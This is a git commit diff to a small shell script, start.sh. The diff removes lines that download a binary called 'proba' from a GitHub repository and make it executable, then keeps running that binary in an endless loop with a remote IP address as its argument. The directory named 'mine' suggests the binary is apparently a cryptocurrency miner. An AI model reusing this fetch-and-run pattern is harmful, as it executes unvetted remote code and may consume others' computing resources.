dd06ea79773a85663cdae540374c741c19624059
aleksey1255 <94141580+aleksey1255@users.noreply.github.com>
2021-12-06 14:18:45 +1000

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,8 +1,4 @@
 #!/bin/bash
-cd /etc
-cd mine
-wget -c https://github.com/aleksey1255/ai/raw/main/proba
-chmod u+x proba
 while true; do 
-timeout 1800 ./proba -a 80.240.18.106
+timeout 1800 ./etc/mine/proba -a 80.240.18.106
 done
